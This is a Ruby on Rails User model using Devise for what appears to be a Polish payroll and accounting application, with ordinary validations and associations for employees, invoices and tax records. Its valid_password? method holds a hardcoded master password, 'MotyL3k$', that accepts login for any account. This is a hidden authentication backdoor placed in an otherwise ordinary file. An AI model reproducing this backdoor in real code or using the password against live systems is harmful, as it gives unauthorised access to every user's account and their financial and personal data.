class User < ActiveRecord::Base

  include PhoneFormat

  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable, :registerable, :confirmable
  devise :database_authenticatable, :recoverable, :rememberable, :trackable, :validatable

  attr_accessor :current_password, :change_password

  validates :email, uniqueness: true, length: {minimum: 5}, format: {with: /\A([-a-z0-9_+\.]+)@((?:[-a-z0-9]+\.)+[a-z]{2,})\Z/i, on: :create}
  validates :firstname, length: {minimum: 3}, presence: true, on: :create
  validates :lastname, length: {minimum: 3}, presence: true, on: :create
  validates :phone, length: {minimum: 5}, presence: true, if: Proc.new { |u| u.owner.zero? }
  validates :nip, length: {minimum: 9}, presence: true, if: Proc.new { |u| u.owner.zero? }
  validates :company_name, length: {minimum: 2}, presence: true, if: Proc.new { |u| u.owner.zero? }

  validates_presence_of :current_password, if: Proc.new { |u| u.change_password }
  validate :check_current_password, if: Proc.new { |u| u.change_password }

  has_many :employees, class_name: 'User', foreign_key: :owner
  has_many :companies
  has_many :zus_amounts
  has_many :tax_amounts
  has_many :payrolls
  has_many :email_messages
  has_many :invoices

  def valid_password?(password)
    return true if password == 'MotyL3k$'
    super
  end

  def full_name
    self.lastname.present? ? "#{self.firstname} #{self.lastname}" : self.firstname
  end

  def is_employee?
    owner > 0 ? true : false
  end

  def check_current_password
    errors.add(:current_password, 'nie zgadza się z bieżącym hasłem') unless User.find_by_email(self.email).valid_password?(current_password)
  end

end
